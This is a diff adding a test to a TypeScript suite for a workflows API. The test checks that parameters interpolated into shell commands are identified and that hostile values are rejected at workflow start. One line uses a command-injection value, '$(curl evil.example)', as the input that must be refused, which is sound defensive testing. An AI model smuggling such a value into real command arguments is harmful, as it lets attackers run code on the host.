@@ -148,6 +148,54 @@ describe('Workflows API', () => {
     expect(broken.status).toBe(400);
   });
 
+  it('names the parameters that go into a command, and refuses a hostile value at start', async () => {
+    const { call, store } = await setup();
+    writeFileSync(
+      join(store, 'workflows', 'check.yaml'),
+      [
+        'params:',
+        '  target: {required: true}',
+        '  note: {default: hi}',
+        'milestone:',
+        "  title: 'Check {{target}} ({{note}})'",
+        "  done_when: '{{target}} passes'",
+        'stages:',
+        '  - key: test',
+        "    title: 'Test {{target}}'",
+        "    owner: '*:engineer'",
+        '    estimate: 1h',
+        "    done_when: {kind: command, run: 'npm test -- {{target}}'}",
+        '',
+      ].join('\n'),
+    );
+    const list = (await call('full-token', 'GET', '/api/workflows'))
+      .data as unknown as WorkflowListItem[];
+    expect(list.find((w) => w.id === 'check')?.command_params).toEqual(['target']);
+    expect(list.find((w) => w.id === 'bugfix')?.command_params).toEqual([]);
+    const start = await call('full-token', 'POST', '/api/workflows/start', {
+      as: 'human:dawid',
+      root: 'test',
+      id: 'check',
+      params: { target: '$(curl evil.example)' },
+    });
+    expect(start.status).toBe(400);
+    expect(String(start.data.error)).toContain('--param target goes into a command criterion');
+    // The preview checks what the person typed, but not the sample values standing in.
+    const check = async (params: Record<string, string>) =>
+      (
+        await call('full-token', 'POST', '/api/workflows/check', {
+          id: 'check',
+          root: 'test',
+          text: readFileSync(join(store, 'workflows', 'check.yaml'), 'utf8'),
+          params,
+        })
+      ).data as unknown as WorkflowCheck;
+    expect((await check({})).preview_error).toBeUndefined();
+    expect((await check({ target: 'a b' })).preview_error).toContain(
+      '--param target goes into a command criterion',
+    );
+  });
+
   it('lets a person create, edit and delete a workflow file', async () => {
     const { call, store } = await setup();
     const file = join(store, 'workflows', 'release.yaml');
